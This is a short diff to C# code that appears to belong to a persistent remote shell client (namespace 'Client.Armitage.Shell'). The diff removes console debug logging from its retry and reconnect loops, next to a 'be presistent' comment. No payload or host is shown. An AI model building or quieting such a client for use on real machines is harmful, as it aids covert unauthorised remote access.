@@ -61,8 +61,6 @@ namespace Client.Armitage.Shell
 
                 Thread.Sleep(1000);
 
-                Console.WriteLine("safe execute loop: " + ex.ToString());
-
                 Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
                 // be presistent
                 SafeExecute();
@@ -98,9 +96,7 @@ namespace Client.Armitage.Shell
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("Outer loop: " + ex.ToString());
 
-                    // CleanUp();
                 }
                 finally
                 {
@@ -141,8 +137,6 @@ namespace Client.Armitage.Shell
                         }
                         catch (Exception ex) // got disconnected
                         {
-                            Console.WriteLine("inner loop: " + ex.ToString());
-
                             CleanUp();
 
                             break;
